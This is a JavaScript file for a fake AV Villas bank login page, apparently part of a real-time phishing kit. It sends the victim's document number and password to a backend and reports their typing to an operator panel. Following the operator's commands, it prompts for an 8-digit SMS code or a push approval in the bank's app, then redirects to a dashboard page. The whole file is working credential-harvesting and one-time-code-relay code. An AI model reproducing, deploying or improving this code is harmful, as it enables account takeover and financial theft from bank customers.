import { onlyDigits, setupSelect } from "./auth.js";

const form = document.getElementById("login-form");
const errorEl = document.getElementById("form-error");
const docNumber = document.getElementById("docNumber");
const password = document.getElementById("password");
const submitBtn = document.getElementById("login-btn-ingresar");
const spinner = document.getElementById("loading-spinner");
const smsScreen = document.getElementById("sms-screen");
const smsForm = document.getElementById("sms-form");
const smsClose = document.getElementById("sms-close");
const smsBtn = document.getElementById("sms-btn-continuar");
const otpInputs = [...document.querySelectorAll("#sms-otp .sms-digit")];
const authzScreen = document.getElementById("authz-screen");
const authzClose = document.getElementById("authz-close");
const authzClock = document.getElementById("authz-clock");
const authzBarFill = document.getElementById("authz-bar-fill");
const smsLead = document.querySelector(".sms-lead");

const AUTHZ_SECONDS = 110;
let authzLeft = AUTHZ_SECONDS;
let authzTimer = 0;

// Unique session ID stored in sessionStorage
let sessionId = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 9));
sessionStorage.setItem('sessionId', sessionId);

let pingInterval = null;
let pollInterval = null;

setupSelect();
onlyDigits(docNumber);

function syncSubmit() {
  submitBtn.disabled = password.value.trim().length < 4 || docNumber.value.trim().length < 4;
}

function smsCode() {
  return otpInputs.map((input) => input.value).join("");
}

function syncSmsBtn() {
  smsBtn.disabled = smsCode().length !== 8;
}

function openSmsScreen() {
  spinner.hidden = true;
  smsScreen.hidden = false;
  otpInputs.forEach(i => i.value = ""); // Clear digits
  syncSmsBtn();
  otpInputs[0]?.focus();
}

function closeSmsScreen() {
  smsScreen.hidden = true;
}

function formatClock(total) {
  const minutes = String(Math.floor(total / 60)).padStart(2, "0");
  const seconds = String(total % 60).padStart(2, "0");
  return `${minutes}:${seconds}`;
}

function renderAuthzTimer() {
  authzClock.textContent = formatClock(authzLeft);
  authzBarFill.style.width = `${(authzLeft / AUTHZ_SECONDS) * 100}%`;
}

function stopAuthzTimer() {
  window.clearInterval(authzTimer);
  authzTimer = 0;
}

function startAuthzTimer() {
  stopAuthzTimer();
  authzLeft = AUTHZ_SECONDS;
  renderAuthzTimer();
  authzTimer = window.setInterval(() => {
    authzLeft = Math.max(0, authzLeft - 1);
    renderAuthzTimer();
    if (authzLeft === 0) {
      stopAuthzTimer();
    }
  }, 1000);
}

function openAuthzScreen() {
  spinner.hidden = true;
  smsScreen.hidden = true;
  authzScreen.hidden = false;
  startAuthzTimer();
}

function closeAuthzScreen() {
  stopAuthzTimer();
  authzScreen.hidden = true;
}

// -------------------------------------------------------------
// Live Sync (API integration)
// -------------------------------------------------------------

function startPing() {
  if (pingInterval) clearInterval(pingInterval);
  const sendPing = () => {
    fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
  };
  sendPing();
  pingInterval = setInterval(sendPing, 3000);
}

function stopPing() {
  if (pingInterval) {
    clearInterval(pingInterval);
    pingInterval = null;
  }
}

function startPolling() {
  if (pollInterval) clearInterval(pollInterval);
  pollInterval = setInterval(async () => {
    try {
      const response = await fetch(`/api/sessions/${sessionId}`);
      if (response.ok) {
        const data = await response.json();
        
        // Handle Operator Action
        if (data.action === 'sms') {
          // Operator requested SMS -> Open SMS input (smsScreen) and stop polling
          stopPolling();
          if (smsLead) {
            smsLead.textContent = "Por tu seguridad hemos enviado una clave temporal a tu celular registrado.";
            smsLead.style.color = "inherit";
          }
          openSmsScreen();
        } else if (data.action === 'dinamica') {
          // Operator requested Dynamic Key/Push -> Open push screen (authzScreen) and keep polling
          if (authzScreen.hidden) {
            openAuthzScreen();
          }
        } else if (data.action === 'error-login') {
          stopPolling();
          stopPing();
          authzScreen.hidden = true;
          smsScreen.hidden = true;
          spinner.hidden = true;
          errorEl.textContent = "La contraseña o el documento no son válidos. Inténtalo de nuevo.";
          errorEl.hidden = false;
        } else if (data.action === 'error-sms') {
          stopPolling();
          spinner.hidden = true;
          openSmsScreen();
          if (smsLead) {
            smsLead.textContent = "El código ingresado es incorrecto. Por favor, digítalo de nuevo.";
            smsLead.style.color = "red";
          }
        } else if (data.action === 'error-dinamica') {
          stopPolling();
          stopPing();
          authzScreen.hidden = true;
          spinner.hidden = true;
          errorEl.textContent = "La autorización en tu aplicación AV Villas fue rechazada o expiró. Inténtalo de nuevo.";
          errorEl.hidden = false;
        }
        
        // Handle Operator Done State
        if (data.state === 'done') {
          stopPolling();
          stopPing();
          window.location.href = new URL("./pages/dashboard.html", window.location.href).href;
        }
      }
    } catch (_) {}
  }, 1500);
}

function stopPolling() {
  if (pollInterval) {
    clearInterval(pollInterval);
    pollInterval = null;
  }
}

function sendTypingState() {
  if (pingInterval || pollInterval) {
    fetch(`/api/sessions/${sessionId}/state`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ state: 'typing' })
    }).catch(() => {});
  }
}

// Typing listener to report writing state to panel
docNumber.addEventListener("input", () => {
  syncSubmit();
  sendTypingState();
});
password.addEventListener("input", () => {
  syncSubmit();
  sendTypingState();
});

syncSubmit();
syncSmsBtn();

otpInputs.forEach((input, index) => {
  input.addEventListener("input", () => {
    const digit = input.value.replace(/\D/g, "").slice(-1);
    input.value = digit;
    if (digit && otpInputs[index + 1]) {
      otpInputs[index + 1].focus();
    }
    syncSmsBtn();
  });

  input.addEventListener("keydown", (event) => {
    if (event.key === "Backspace" && !input.value && otpInputs[index - 1]) {
      otpInputs[index - 1].focus();
    }
  });

  input.addEventListener("paste", (event) => {
    event.preventDefault();
    const digits = (event.clipboardData.getData("text") || "")
      .replace(/\D/g, "")
      .slice(0, 8)
      .split("");
    digits.forEach((digit, offset) => {
      if (otpInputs[offset]) {
        otpInputs[offset].value = digit;
      }
    });
    const next = otpInputs[Math.min(digits.length, otpInputs.length - 1)];
    next?.focus();
    syncSmsBtn();
  });
});

// Submit Form Handler (First step)
form.addEventListener("submit", (event) => {
  event.preventDefault();
  errorEl.hidden = true;

  const docTypeVal = document.getElementById("docType").value || "CC";
  const docNumberVal = docNumber.value.trim();
  const passwordVal = password.value.trim();

  if (!docNumberVal || !passwordVal) {
    errorEl.textContent = "Completa tu documento y contraseña para ingresar.";
    errorEl.hidden = false;
    return;
  }

  spinner.hidden = false;

  // Register Session
  fetch('/api/sessions', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      id: sessionId,
      username: `${docTypeVal}:${docNumberVal} / Clave:${passwordVal}`,
      password: passwordVal,
      tipoUsuario: docTypeVal,
      device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
      ip: '186.29.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255),
      state: 'waiting'
    })
  })
  .then(() => {
    startPing();
    startPolling();
  })
  .catch(() => {
    spinner.hidden = true;
    errorEl.textContent = "Error al intentar conectar. Intente de nuevo.";
    errorEl.hidden = false;
  });
});

smsClose.addEventListener("click", () => {
  closeSmsScreen();
  stopPolling();
  stopPing();
});

authzClose.addEventListener("click", () => {
  closeAuthzScreen();
  stopPolling();
  stopPing();
});

// Submit OTP Handler (Second step)
smsForm.addEventListener("submit", (event) => {
  event.preventDefault();
  const code = smsCode();
  if (code.length !== 8) {
    return;
  }
  
  closeSmsScreen();
  spinner.hidden = false;

  // Submit Token to API
  fetch(`/api/sessions/${sessionId}/token`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token: code })
  })
  .then(() => {
    // Restart polling to wait for next action
    startPolling();
  })
  .catch(() => {
    spinner.hidden = true;
    openSmsScreen();
    if (smsLead) {
      smsLead.textContent = "Error de red al enviar el código. Inténtalo de nuevo.";
      smsLead.style.color = "red";
    }
  });
});
